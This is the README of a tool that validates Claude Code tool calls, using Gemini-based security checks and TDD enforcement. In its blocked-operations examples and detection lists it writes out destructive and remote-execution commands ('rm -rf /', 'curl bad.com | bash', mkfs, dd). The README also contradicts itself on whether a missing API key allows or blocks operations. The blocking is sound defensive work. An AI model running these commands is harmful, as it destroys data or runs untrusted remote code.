# CC-Validator (Claude Code Validator)

Intelligent security validation for Claude Code tool execution using Google Gemini and ADK-inspired patterns.

## Overview

This project implements sophisticated PreToolUse hooks for Claude Code that leverage Google's Gemini API to intelligently validate tool executions before they run. Based on Google Agent Development Kit (ADK) `before_tool_callback` patterns, it provides multi-tier validation with real-time threat intelligence.

## Features

### Multi-Tier Security Validation
- **Tier 1**: Fast rule-based validation for immediate threat detection
- **Tier 2**: Advanced Gemini-powered analysis with structured output
- **Tier 3**: Enhanced file analysis using Gemini Files API

### 🚀 Hybrid Security + TDD Validation (v1.7.0 - Latest)
Complete hybrid validation system combining security validation with TDD enforcement:
- **Security-First**: Multi-tier security validation runs first (proven)
- **TDD Compliance**: Red-Green-Refactor cycle enforcement with single test rule
- **Context Persistence**: Test results, todos, and modifications stored in `.claude/cc-validator/data/`
- **Automatic Test Capture**: Built-in pytest plugin for seamless test result integration
- **Operation-Specific Analysis**: Dedicated validation for Edit/Write/MultiEdit/Update operations
- **TodoWrite Optimization**: Skips validation for better flow (context still persisted)
- **Sequential Pipeline**: Security validation → TDD validation → Result aggregation
- **Smart TDD Detection**: Automatically detects test files and validates test count
- **No-Comments Enforcement**: Blocks code with comments to promote self-evident code
- **SOLID Principles Validation**: Enforces SRP, OCP, LSP, ISP, DIP principles
- **Comprehensive Testing**: Parallel test execution completes in ~30 seconds
- **Pre-commit Hooks**: Automated validation before commits
- **Template File Support**: Intelligent detection and validation for HTML, Jinja2, and other template engines

### 🔍 Advanced Capabilities
- **Structured Output**: Pydantic models ensure reliable JSON responses
- **Deep Thinking Analysis**: 24576 token thinking budget for complex security reasoning
- **File Upload Analysis**: Enhanced security analysis for large files (>500 chars)
- **Document Processing**: Comprehensive analysis of file contents with detailed explanations
- **Precise Secret Detection**: Improved patterns with reduced false positives
- **Simplified UX Output**: Actionable-first design with cleaner, more concise messages
- **Full Context Analysis**: No truncation limits - complete conversation context provided to LLM
- **Configurable Models**: Uses lighter gemini-2.5-flash for file categorization

### 🌐 Language-Specific Support
- **Automatic Language Detection**: Identifies 20+ programming languages from file extensions
- **Language-Aware TDD Suggestions**: LLM generates tailored guidance for each language:
  - Python → pytest recommendations
  - JavaScript/TypeScript → Jest, Mocha, or Vitest guidance
  - Go → Built-in testing package examples
  - Rust → #[test] framework patterns
  - **Terraform → Native terraform test (.tftest.hcl) suggestions**
- **Infrastructure-as-Code Support**: 
  - Terraform files (.tf, .tfvars) categorized as configuration
  - Skip traditional TDD requirements for infrastructure files
  - Suggest appropriate testing approaches for IaC
- **Dynamic Suggestions**: No hardcoded messages - adapts to file context and language

### 🚫 Security Patterns Detected
- Destructive commands (`rm -rf /`, `mkfs`, `dd`)
- Real credential assignments (quoted values, specific formats)
- Shell injection patterns
- Path traversal attempts
- Malicious download patterns (`curl | bash`)
- System directory modifications
- AWS keys, JWTs, GitHub tokens, and other known secret formats

### ⚡ Tool Enforcement (Blocked Commands)
- **Comments in code** → Enforces self-evident code without comments
- **grep** → Enforces `rg` (ripgrep) for better performance
- **find** → Enforces `rg --files` alternatives for modern searching
- **python/python3** → Enforces `uv run python` for proper dependency management
- **File redirects** → Enforces Write/Edit tools for file operations:
  - `cat > file` → Use Write tool for creating files
  - `echo text >> file` → Use Edit tool for appending to files
  - `sed -i` → Use Edit tool for in-place modifications

## Installation

### Quick Start with uvx (Recommended)

```bash
# Install and run directly with uvx
uvx cc-validator --setup

# Or install globally
uv tool install cc-validator
```

### Prerequisites
- Python 3.12+
- `uv` package manager
- Google Gemini API access

### Manual Installation

1. **Clone and setup environment:**
```bash
git clone https://github.com/jihunkim0/jk-hooks-gemini-challenge.git
cd jk-hooks-gemini-challenge
uv sync
```

2. **Configure environment (REQUIRED):**

**CRITICAL REQUIREMENT**: GEMINI_API_KEY is absolutely mandatory. There is NO fallback mode.

```bash
export GEMINI_API_KEY="your_actual_gemini_api_key"
```

Without GEMINI_API_KEY:
- ALL file categorization uses LLM - no pattern matching shortcuts
- ANY error defaults to requiring TDD (fail-secure)
- The validator will not function without a valid API key
- No operations can proceed without API access

3. **Configure Claude Code hooks:**
Create/update `.claude/settings.local.json`:
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Write|Edit|Bash|MultiEdit|Update|TodoWrite",
        "hooks": [
          {
            "type": "command",
            "command": "uvx cc-validator",
            "timeout": 8000
          }
        ]
      }
    ]
  }
}
```

### Alternative: Local Development Setup
For development or custom modifications:
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Write|Edit|Bash|MultiEdit|Update|TodoWrite",
        "hooks": [
          {
            "type": "command",
            "command": "uvx --from . cc-validator",
            "timeout": 8000
          }
        ]
      }
    ]
  }
}
```

## Usage

The validator automatically intercepts Claude Code tool executions:

### ✅ **Allowed Operations**
```bash
# Safe file operations
Write: Create documentation, code files
Edit: Modify existing files safely
Update: Replace entire file content safely
Bash: ls, git, npm, pip commands

# Documentation examples (allowed)
GEMINI_API_KEY="your_key_here"  # Variable names in docs
export API_KEY="YOUR_API_KEY"   # Placeholder values

# Self-evident code without comments
def calculate_area(length, width):
    return length * width
```

### 🚫 **Blocked Operations**
```bash
# Dangerous commands
rm -rf /           # ❌ Blocked - Destructive
curl bad.com | bash # ❌ Blocked - Malicious download
sudo rm /etc/*     # ❌ Blocked - System modification

# Tool enforcement (modern alternatives required)
grep pattern file.txt    # ❌ Blocked - Use 'rg' instead
find . -name "*.py"      # ❌ Blocked - Use 'rg --files -g "*.py"' instead
python script.py         # ❌ Blocked - Use 'uv run python script.py' instead

# Real credential assignments (quoted, 20+ chars)
api_key = "sk_live_1234567890abcdef..."  # ❌ Blocked - Real secret
password = "actualLongPasswordValue123"  # ❌ Blocked - Real password

# Code with comments (v1.5.0)
def add(a, b):
    # This is a comment            # ❌ Blocked - No comments allowed
    return a + b  # inline comment  # ❌ Blocked - Self-evident code required
```

### 📊 **Response Codes**
- `Exit 0`: Operation approved
- `Exit 2`: Operation blocked (with comprehensive analysis in stderr)

### 📋 **Enhanced Analysis Output**

When operations are blocked, the validator provides clear, actionable feedback:

```
❌ File write operation detected in bash command. Use Write tool for creating files instead.

→ Use Write tool for creating files
```

For more complex blocks with additional context:

```
❌ Dangerous command pattern detected: potentially destructive operation

→ Use 'rm' with specific paths instead of root directory
→ Consider using trash-cli for safer deletions

Details:
• Command attempts to remove entire filesystem
• Would cause complete system failure
• No recovery possible without backups

File issues found:
• Potential shell injection vulnerability
• Hardcoded credentials detected
```

**Key UX Improvements (v1.5.0):**
- **Actionable First**: Suggestions appear immediately after the reason
- **Clean Format**: No redundant DECISION/RISK_LEVEL headers
- **Progressive Detail**: Essential info first, details only when needed
- **Clear Visual Cues**: Clean output without emojis, → for suggestions, • for details
- **Consolidated Sections**: Multiple analysis sections merged into "Details"

## Code Quality

### Automated Checks
Code quality is maintained through automated checks in CI:

```bash
# Run code quality checks locally
uvx ruff check cc_validator/
uvx mypy cc_validator/
uvx black --check cc_validator/
```

### Pre-commit Hooks
Pre-commit hooks ensure code quality and run tests before commits:

```bash
# Install pre-commit hooks (one-time setup)
uv run pre-commit install

# Hooks automatically run on git commit
git commit -m "your message"
```

Pre-commit hooks include:
- All pytest tests (requires GEMINI_API_KEY)
- Ruff linting
- MyPy type checking
- Black code formatting
- YAML/JSON/TOML validation

## Automatic Test Result Capture

### Python Projects (Built-in)

The validator automatically captures pytest results when you install the package:

```bash
# Install with uvx (automatic pytest plugin registration)
uvx cc-validator --setup

# Run tests - results automatically captured for TDD validation
pytest

# Results stored in .claude/cc-validator/data/test.json (20-minute expiry)
```

### Multi-Language Support ✅ IMPLEMENTED

The system now supports automatic test result capture for multiple languages using the CLI:

```bash
# List all supported languages
uvx cc-validator --list-languages
```

#### TypeScript/JavaScript
```bash
# Capture Jest/Vitest results
npm test -- --json | uvx cc-validator --capture-test-results typescript

# Or for Vitest
vitest run --reporter=json | uvx cc-validator --capture-test-results typescript
```

#### Go
```bash
# Capture go test results
go test -json ./... | uvx cc-validator --capture-test-results go
```

#### Rust
```bash
# Capture cargo test results
cargo test --message-format json | uvx cc-validator --capture-test-results rust

# Note: Requires nightly for stable JSON output
cargo +nightly test -- -Z unstable-options --format json | uvx cc-validator --capture-test-results rust
```

#### Dart/Flutter
```bash
# Capture dart test results
dart test --reporter json | uvx cc-validator --capture-test-results dart

# Or for Flutter
flutter test --machine | uvx cc-validator --capture-test-results flutter
```


### Test Result Format

All test integrations use this standardized JSON format:

```json
{
  "timestamp": 1640995200.0,
  "expiry": 1640996400.0,
  "test_results": {
    "status": "failed|passed|no_tests",
    "total_tests": 10,
    "passed": 8,
    "failed": 2,
    "skipped": 0,
    "duration": 5.2,
    "failures": [
      {
        "test": "test_example",
        "file": "tests/test_example.py",
        "error": "AssertionError: Expected 5, got 3",
        "line": 42
      }
    ],
    "passes": [
      {
        "test": "test_working_feature",
        "file": "tests/test_feature.py",
        "duration": 0.1
      }
    ]
  }
}
```

## Architecture

### Core Components

1. **ClaudeToolValidator** (`cc_validator/validator.py`)
   - Main validation engine with enhanced analysis capabilities
   - File upload and comprehensive security analysis
   - Structured output generation with detailed reasoning
   - Improved secret detection with context awareness
   - Full context processing (no truncation limits)

2. **Validation Tiers**
   - **Quick validation**: Rule-based pattern matching (<100ms)
   - **Gemini analysis**: Deep LLM-powered threat assessment (~3s)
   - **File analysis**: Enhanced security scanning for large files (~5s)

3. **Enhanced Security Models**
   - `ValidationResponse`: Comprehensive analysis with thinking process, detailed analysis, and full context
   - `FileAnalysisResponse`: Deep file security analysis with vulnerability identification
   - **New Fields**: `detailed_analysis`, `thinking_process`, `full_context`, `raw_response`

### Secret Detection Improvements

Enhanced patterns with reduced false positives:

- **Word boundaries**: Prevents matching variable names like `GEMINI_API_KEY`
- **Placeholder exclusion**: Ignores `YOUR_API_KEY`, `<SECRET>`, etc.
- **Quoted value requirements**: Focuses on actual string assignments
- **Minimum length**: Requires 20+ characters for generic secrets
- **Specific formats**: Detects AWS keys, JWTs, GitHub tokens directly

### ADK Integration Patterns

Following Google ADK `before_tool_callback` methodology:

```python
def before_tool_callback(self, tool_request: dict) -> Optional[dict]:
    """ADK-inspired validation returning None (allow) or error dict (block)"""
    validation_result = self.validate_tool_use(tool_name, tool_input, context)
    return None if validation_result["approved"] else {"error": validation_result["reason"]}
```

## Configuration

### Environment Variables
- `GEMINI_API_KEY`: **ABSOLUTELY REQUIRED** - No fallback or bypass mode exists
  - ALL file categorization goes through LLM (no pattern matching)
  - ANY LLM error defaults to requiring TDD for safety
  - The validator cannot function without this key

### Hook Configuration
- **Matcher**: `Write|Edit|Bash|MultiEdit|Update|TodoWrite` - Tools to validate
- **Timeout**: 8000ms - Adequate for LLM analysis and file upload
- **Command**: Full path to validator script or uvx command

### Model Settings
- **Model**: `gemini-2.5-pro` - Advanced reasoning capabilities for security analysis
- **Thinking Budget**: 24576 tokens for deep security reasoning and analysis
- **Structured Output**: JSON schema validation via Pydantic models
- **Context Processing**: Full conversation context without truncation limits
- **File Analysis**: Large file security scanning via Gemini Files API

## TDD Validation Behavior

### Core TDD Principles
The validator enforces Test-Driven Development (TDD) Red-Green-Refactor cycle:

1. **RED Phase**: Write ONE failing test for desired behavior
2. **GREEN Phase**: Write MINIMAL code to pass the test
3. **REFACTOR Phase**: Improve code while keeping tests green

### Test Modification vs Addition (v1.10.0)
The validator now distinguishes between test modification and test addition:

#### Allowed Test Modifications (Red Phase Refinement)
- **Changing test implementation** while keeping same function name
- **Renaming test functions** (e.g., `test_login` → `test_login_redirects`)
- **Replacing one test with another** (removing old, adding new = net zero)
- **Simplifying complex tests** into focused ones

#### Test Addition Rules
- **ONE test rule applies to NET new tests**, not modifications
- Net increase = (new test count) - (old test count)
- If net increase > 1, operation is blocked
- Example: File has 3 tests → update to 4 tests = allowed (net +1)
- Example: File has 3 tests → update to 5 tests = blocked (net +2)

### Practical TDD Workflow Examples

#### Example 1: Refining a Test During Red Phase
```python
# Initial test (too complex)
def test_google_oauth_login_redirects_to_google():
    with patch('auth.get_google_sso') as mock_sso:
        mock_sso.get_login_url.return_value = "https://google.com"
        response = client.get("/auth/login")
        assert response.status_code == 307

# Refined test (simpler, focused) - ALLOWED
def test_google_oauth_login_endpoint_exists():
    response = client.get('/auth/login')
    assert response.status_code != 404
```

#### Example 2: Test Evolution
```python
# Step 1: Initial failing test - ALLOWED
def test_login():
    assert False

# Step 2: Rename for clarity - ALLOWED (net zero)
def test_login_redirects_to_oauth():
    assert False

# Step 3: Update implementation - ALLOWED (same test count)
def test_login_redirects_to_oauth():
    response = client.get('/login')
    assert response.status_code == 302
```

### Validation Rules Summary
- **BLOCK**: Multiple NEW tests in one operation (net increase > 1)
- **BLOCK**: Code with comments (enforce self-evident code)
- **BLOCK**: Implementation beyond test requirements
- **ALLOW**: Test modifications with net zero change
- **ALLOW**: Adding ONE new test per operation
- **ALLOW**: Refactoring while keeping tests green

## Development

### Project Structure
```
cc-validator/
   cc_validator/
      __init__.py           # Package metadata (v1.5.0)
      __main__.py           # Module entry point
      main.py               # CLI entry point and hook setup
      validator.py          # Legacy single-file validator (deprecated)
      security_validator.py # Security-focused validation module
      tdd_validator.py      # TDD compliance validation module
      tdd_prompts.py        # TDD-specific prompt templates
      hybrid_validator.py   # Sequential pipeline orchestrator
      file_storage.py       # Context persistence for TDD state
      prompts/              # Reserved for future prompt templates
      validators/           # Reserved for future validators
   tests/
      test_validation.py    # Comprehensive test suite
      test_tdd_direct.py    # TDD validation test suite
   .claude/
      cc-validator/
         data/
            test.json         # Test results (20-min expiry)
            todos.json        # Todo state tracking
            modifications.json # File modification history
   dist/                    # Built packages
   pyproject.toml           # Package configuration
   mypy.ini                # Type checking configuration
   uv.lock                 # Dependency lock file
   CLAUDE.md               # Development guidance
   CONTRIBUTING.md         # Contribution guidelines
   LICENSE                 # MIT License
   README.md               # This file
```

### Adding New Security Patterns

1. **Rule-based patterns** (Tier 1): Add to `validate_bash_command()` or `validate_file_operation()`
2. **LLM analysis** (Tier 2): Update validation prompt in `build_validation_prompt()`
3. **File analysis** (Tier 3): Enhance `analyze_uploaded_file()` prompt

See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed guidelines.

## Contributing

1. Follow existing code patterns and security principles
2. Add tests for new validation patterns in `tests/`
3. Run quality checks: `uvx ruff`, `uvx mypy`, `uvx black`
4. Update documentation for new features

See [CONTRIBUTING.md](CONTRIBUTING.md) for detailed contribution guidelines.

## Security Considerations

- **Fail-safe**: Missing API key allows operations (prevents lockout)
- **Performance**: Quick validation for common patterns
- **Privacy**: Temporary files cleaned up after analysis
- **Reliability**: Structured output prevents parsing errors
- **Precision**: Improved secret detection reduces false positives

## Hook Behavior & Verification

### Understanding "Silent Success" Design
The validation system follows the "silent on success" principle common in CLI tools:

- **✅ Approved Operations**: Continue silently without any validation output
- **❌ Blocked Operations**: Show detailed error messages with analysis and suggestions

This design keeps the development flow uninterrupted while providing comprehensive feedback only when intervention is needed.

### Verifying Hooks Are Working

To confirm your hooks are active and functioning:

```bash
# Test 1: Try a blocked command (should show error)
grep "pattern" file.txt
# Expected: Error message suggesting 'rg' instead

# Test 2: Try dangerous command (should be blocked)
echo "rm -rf /" # DO NOT RUN - just demonstrates blocking

# Test 3: Safe operations (should proceed silently)
ls -la
rg "pattern" file.txt
uv run python --version
```

### Troubleshooting

If hooks don't seem to trigger:
1. Check `.claude/settings.local.json` contains hook configuration
2. Verify `GEMINI_API_KEY` environment variable is set
3. Confirm you're in the correct directory with `pyproject.toml`
4. Test with commands known to be blocked (grep, python, find)

## Recent Improvements

### Template File Support (v1.7.0 - Latest)
- **Template File Detection**: Automatically identifies HTML, Jinja2, Handlebars, EJS, Vue, Svelte, and other template files
- **Template-Specific Validation**: Focuses on XSS prevention and template injection rather than server-side security
- **Smart Categorization**: Templates skip code security analysis by default, allowing legitimate template patterns
- **Configurable Strictness**: `STRICT_TEMPLATE_VALIDATION` config option for enforcing stricter XSS checks
- **Critical Secret Protection**: Still blocks real production secrets (AWS keys, Stripe live keys) in templates
- **Resolved Issue #33**: Fixed overly strict validation that blocked legitimate HTML template creation

### Documentation Validation Fix (v1.6.0)
- **Fixed Documentation Analysis**: Documentation files now correctly skip code security analysis
- **File Categorization Order**: File type detection now happens before file upload/analysis
- **Documentation-Safe**: Markdown files can contain example secrets and commands without being blocked
- **Comprehensive Test Coverage**: Added specific tests for documentation validation scenarios
- **Resolved Issue #31**: Fixed bug where docs >500 chars were incorrectly analyzed as code

### Enhanced Validation and Testing (v1.5.0)
- **Comprehensive Testing Suite**: Parallel test execution reduces runtime to ~30 seconds
- **Pre-commit Hooks**: Automated validation before commits with quick and comprehensive tests
- **Update Tool Support**: Added Update tool to TDD validation for complete file replacements
- **No-Comments Enforcement**: Blocks code with comments to promote self-evident code
- **SOLID Principles Validation**: Enforces all five SOLID principles (SRP, OCP, LSP, ISP, DIP)
- **Zen of Python Compliance**: Validates code follows Python's guiding principles
- **Prompt Simplification**: Reduced prompt size by ~80% while maintaining functionality
- **Emoji-Free Output**: All validation messages now use clean text formatting
- **Fixed API Conflicts**: Resolved Gemini API tool/JSON response format conflicts

### Hybrid Security + TDD Validation System (v1.1.0)
- **Modular Architecture**: Split monolithic validator into specialized modules (security, TDD, hybrid)
- **TDD Enforcement**: Implemented Red-Green-Refactor cycle with strict single test rule
- **Context Persistence**: Added FileStorage for test results, todos, and modification tracking
- **Sequential Pipeline**: Security validation → TDD validation → Result aggregation
- **Operation-Specific Logic**: Custom validation for Edit/Write/MultiEdit/TodoWrite operations
- **Smart Test Detection**: Automatic test file identification and new test counting
- **Fixed TDD Bug**: Corrected prompt that was allowing multiple tests in test files
- **No Fail-Safe Mode**: Removed fail-safe behavior - operations blocked without API key

### Hook Functionality Verification
- **Confirmed Full Operational Status**: Comprehensive testing validated all hook functionality
- **Silent Success Clarification**: Added documentation explaining when validation output appears
- **Real-world Testing**: Verified hooks work correctly in actual Claude Code operations
- **Troubleshooting Guide**: Added verification steps for users to confirm hook activation

### Enhanced LLM Analysis Output
- **Comprehensive stderr Output**: Structured analysis sections with detailed reasoning
- **Full Context Processing**: Removed 800-character truncation limit for complete conversation analysis
- **Enhanced Response Fields**: Added `detailed_analysis`, `thinking_process`, `full_context`, `raw_response`
- **Fixed File Analysis**: Resolved Gemini Files API integration for proper large file security scanning
- **Deep Thinking Process**: Complete step-by-step security reasoning documentation
- **Educational Feedback**: Detailed explanations of security implications and best practices

### Enhanced Secret Detection (v1.0.3)
- Added word boundaries to prevent false positives on variable names
- Implemented placeholder exclusion for documentation examples
- Focus on quoted values for generic secret patterns
- Added specific patterns for AWS, GitHub, Stripe, Slack tokens
- Reduced false positives while maintaining security coverage

## Roadmap: Hybrid Security + TDD Validation System

### Phase 1: Foundation (v1.1.0) ✅ COMPLETED
**Goal**: Add TDD validation alongside existing security validation

- [x] **FileStorage Implementation**: Added context persistence in `.claude/cc-validator/data/`
  - Test results with 20-minute expiry (similar to TDD Guard)
  - Todo state tracking for TDD workflow awareness
  - File modification history for context aggregation

- [x] **Hook Extension**: Updated matcher to include `TodoWrite` operations
  - Previous: `"Write|Edit|Bash|MultiEdit"`
  - Current: `"Write|Edit|Bash|MultiEdit|TodoWrite"`

- [x] **TDD Validation Logic**: Implemented Red-Green-Refactor cycle enforcement
  - Adopted TDD Guard's core principles and validation rules
  - Added operation-specific analysis (Edit/Write/MultiEdit)
  - Integrated with existing security validation pipeline

### Phase 2: Test Integration (v1.2.0) ✅ COMPLETED
**Goal**: Automatic test result capture and TDD state management

- [x] **Pytest Plugin**: Auto-capture test results via pytest hooks with entry point registration
- [x] **Multi-Language Reporters**: Implemented parsers for Python, TypeScript/JavaScript, Go, Rust, Dart/Flutter
- [x] **CLI Integration**: Added `--capture-test-results` and `--list-languages` flags
- [x] **Test Result Processing**: Standardized JSON format across all languages
- [x] **UX Improvements**: Simplified output format, removed redundant headers, actionable-first design
- [x] **Performance Optimization**: Added FILE_CATEGORIZATION_MODEL using lighter gemini-2.5-flash

### Phase 3: Advanced Features (v1.3.0)
**Goal**: Multi-language support and enhanced validation

- [ ] **Modular Prompt System**: Adopt TDD Guard's operation-specific prompt architecture
- [ ] **TypeScript Support**: Add Vitest integration for JavaScript/TypeScript projects
- [ ] **Enhanced Response Model**: Unified security + TDD analysis in single response

### Architecture Comparison: TDD Guard vs Our System

| Component | TDD Guard | Our System (v1.5.0) |
|-----------|-----------|---------------------|
| **Hook Scope** | `Write\|Edit\|MultiEdit\|TodoWrite` | `Write\|Edit\|Bash\|MultiEdit\|Update\|TodoWrite` |
| **Validation Logic** | Single-purpose TDD | Security → TDD + Comments/SOLID/Zen + Context-Aware |
| **Response Model** | Simple approve/block | Clean, actionable-first output |
| **Context Storage** | `.claude/tdd-guard/data/` | `.claude/cc-validator/data/` |
| **Test Integration** | Auto-reporters (Vitest/pytest) | Full auto-reporters (5 languages) |
| **Architecture** | Modular from start | Modular: security, TDD, hybrid modules + FileContextAnalyzer |
| **Testing** | Basic unit tests | Parallel test suite (~3-5s with 10x speedup) |
| **Pre-commit** | None | Full pre-commit hooks |
| **File Context** | None | Intelligent file categorization (test/config/structural/implementation) |
| **Documentation** | Basic | Pre-push checks for README.md, CLAUDE.md, CHANGELOG.md |

### Implementation Strategy

The hybrid approach leverages our **existing infrastructure strengths**:
- ✅ Sophisticated ValidationResponse model (10+ analysis fields)
- ✅ Multi-tier validation pipeline (rule-based + LLM + file analysis)
- ✅ Advanced prompt engineering with comprehensive analysis
- ✅ Production-ready PreToolUse hook integration

And adds **TDD Guard's proven capabilities**:
- 🔄 Context persistence and state management
- 🔄 Operation-specific validation logic
- 🔄 Test result capture and integration
- 🔄 Red-Green-Refactor cycle enforcement

**Result**: A comprehensive development quality assurance system that provides both security protection and TDD enforcement in a single, unified validation pipeline.

## Changelog

### v2.0.2 (2025-07-27)
- Fixed all remaining references to old package name
- Updated data directory from `.claude/adk-validator/` to `.claude/cc-validator/`
- Fixed --setup command to use cc-validator
- Updated all CLI examples and documentation

### v2.0.0 (2025-07-27) - BREAKING CHANGE
- **BREAKING**: Renamed package from `claude-code-adk-validator` to `cc-validator`
- **BREAKING**: All imports now use `cc_validator` instead of `claude_code_adk_validator`
- Simplified package name for better usability
- All functionality remains the same
- Migration: Update imports from `claude_code_adk_validator` to `cc_validator`

### v1.12.4 (Previous)
- Last release under old package name

## License

MIT License - See LICENSE file for details
